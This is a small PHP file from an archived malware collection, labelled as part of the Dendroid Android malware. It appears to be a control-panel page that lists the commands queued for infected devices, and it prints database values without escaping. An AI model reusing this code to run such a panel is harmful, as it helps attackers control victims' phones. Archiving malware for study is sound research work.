/*
  name      Dendroid
  type      android
  cve       —
  year      unknown
  os        Android
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
<?php
include("functions.php");

  $mycommand = "SELECT * FROM commands";
  
  foreach ($connect->query($mycommand) as $row) {
    echo "<strong>" . $row['uid'] . ": </strong>" . $row['command'] . "(" . $row['arg1'] . ", " . $row['arg2'] . ")";
	echo "<br/>";
  }

?>